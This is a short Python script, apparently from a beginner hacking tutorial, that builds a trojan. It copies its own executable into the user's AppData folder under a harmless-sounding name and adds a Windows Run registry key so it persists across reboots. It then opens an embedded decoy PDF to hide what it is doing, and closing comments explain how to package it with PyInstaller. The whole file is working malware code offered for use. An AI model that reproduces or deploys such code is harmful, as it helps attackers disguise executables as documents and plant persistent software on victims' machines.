import time
import subprocess
import os
import shutil 											#for copying files							
import sys												#to get our current working exe						

def add_to_registry(): 									#persitence
	'''
	new_file = os.environ["HOMEPATH"] 		#we don't exactly know the user name(if it's dell or user or sarthak,etc).This will give us the full path of user.
	print(new_file)
	new_file=os.environ["appdata"]				#similarly this will give us the complete path of appdata(any random folder to hide our exe).
	'''
	new_file=os.environ["appdata"] + "//sysupgrades.exe"	#will add sysupgrades.exe(any random name which is less suspicious) to the folder		
	if not os.path.exists(new_file):					
		shutil.copyfile(sys.executable, new_file)			#sys.executable gives us the current working exe file, new_file is the place we want to copy our exe.		
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v hacked /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file():
	added_file = sys._MEIPASS + "\\<pdfFile.pdf>"		#MEIPASS is a temporary/special folder,where the data we add is saved and we can get it by giving the full path.
	subprocess.Popen(added_file,shell=True)			#Popen opens the file in background.

open_added_file()

x=0
while x<100:
	print("hAcKeD...")
	x+=1
	time.sleep(0.5)

'''
In cmd, : <.\.\...\pyinstaller.exe> <python_file.py> --onefile --add-data "location\of\the\pdf\file.pdf;." 	( ;. should be added at the end)
.exe file will be saved in the dist folder as usual.
'''